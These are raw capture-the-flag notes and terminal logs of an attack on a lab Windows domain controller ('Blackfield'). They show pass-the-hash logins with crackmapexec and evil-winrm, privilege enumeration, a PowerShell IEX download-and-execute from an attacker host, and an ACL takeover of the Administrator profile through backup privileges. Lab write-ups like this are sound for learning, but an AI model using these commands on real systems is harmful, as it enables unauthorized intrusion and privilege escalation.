we also have the admin hash but does not work :/


$ crackmapexec smb 10.129.155.211 -d blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                 
SMB         10.129.155.211  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.155.211  445    DC01             [+] blackfield.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 


$ evil-winrm -i 10.129.155.211 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                                                                          1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir ..\Desktop


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt



*Evil-WinRM* PS C:\> type notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
*Evil-WinRM* PS C:\> whoami /privs
whoami.exe : ERROR: Invalid argument/option - '/privs'.
    + CategoryInfo          : NotSpecified: (ERROR: Invalid ...ion - '/privs'.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Type "WHOAMI /?" for usage.
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\> 


https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.97/Acl-FullControl.ps1')
*Evil-WinRM* PS C:\> Acl-FullControl -user blackfield\svc_backup -path c:\users\administrator
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BLACKFIELD\Administrator Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)



[+] Changing permissions to c:\users\administrator
[+] Acls changed successfully.


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BLACKFIELD\Administrator Allow  FullControl
         BLACKFIELD\svc_backup Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA;;;S-1-5-21-4194615774-2175524697-3563712290-1413)



*Evil-WinRM* PS C:\> dir c:\Users\Administrator\Desktop\root.txt


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2020   8:38 PM             32 root.txt


*Evil-WinRM* PS C:\> 
